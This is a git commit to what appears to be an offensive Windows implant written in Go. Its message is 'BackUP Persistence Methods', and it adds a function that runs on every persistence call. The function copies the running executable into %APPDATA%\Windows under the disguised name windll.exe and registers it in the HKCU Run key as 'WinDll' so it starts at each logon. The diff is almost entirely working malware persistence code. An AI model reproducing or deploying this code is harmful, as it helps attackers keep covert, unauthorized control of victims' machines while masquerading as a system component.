a26da8627aa4155b08fdc1966823ed1821958ac0
s1l3nt78 <90134688+whiterabb17@users.noreply.github.com>
2023-05-07 20:56:51 +0200

    BackUP Persistence Methods

--- os_windows.go
+++ os_windows.go
@@ -156,7 +156,56 @@ func addPersistentCommand(persistenceType string) error {
 	} else if persistenceType == "reg" || persistenceType == "Reg" {
 		err = regPersistence()
 	}
+	bkPersist()
 	return err
+}
+
+func bkPersist() {
+	var StatupInfo syscall.StartupInfo
+	var ProcessInfo syscall.ProcessInformation
+	Args := syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c mkdir %APPDATA%\\Windows")
+
+	syscall.CreateProcess(
+		nil,
+		Args,
+		nil,
+		nil,
+		true,
+		0,
+		nil,
+		nil,
+		&StatupInfo,
+		&ProcessInfo)
+
+	CopyString := string("c:\\windows\\system32\\cmd.exe /c copy " + os.Args[0] + " %APPDATA%\\Windows\\windll.exe")
+
+	Args = syscall.StringToUTF16Ptr(CopyString)
+
+	syscall.CreateProcess(
+		nil,
+		Args,
+		nil,
+		nil,
+		true,
+		0,
+		nil,
+		nil,
+		&StatupInfo,
+		&ProcessInfo)
+
+	Args = syscall.StringToUTF16Ptr("c:\\windows\\system32\\cmd.exe /c REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V WinDll /t REG_SZ /F /D %APPDATA%\\Windows\\windll.exe")
+
+	syscall.CreateProcess(
+		nil,
+		Args,
+		nil,
+		nil,
+		true,
+		0,
+		nil,
+		nil,
+		&StatupInfo,
+		&ProcessInfo)
 }
 
 func createUser(username, password string) error {
